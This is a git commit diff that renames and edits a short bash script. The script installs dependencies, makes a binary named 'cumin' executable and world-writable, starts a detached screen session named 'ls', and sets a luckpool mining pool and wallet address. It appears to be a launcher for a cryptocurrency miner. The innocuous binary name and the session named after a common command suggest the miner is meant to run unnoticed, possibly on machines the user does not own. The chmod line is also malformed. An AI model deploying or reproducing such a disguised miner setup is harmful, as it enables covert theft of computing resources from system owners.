68836d1ce7e7e230f6b41c1438a5e5d34cf74684
wreytrfser <86676957+wreytrfser@users.noreply.github.com>
2021-07-18 11:34:24 +0700

    Update and rename bagus.sh to hade.sh

--- hade.sh
+++ hade.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x kokoh.sh && chmod +x cumin chmod 777 cumin kokoh.sh
+chmod +x bagus.sh && chmod +x cumin chmod 777 cumin bagus.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RDpbTQzyf4R8FQJjzwQDjs7nzfxui9JcgF
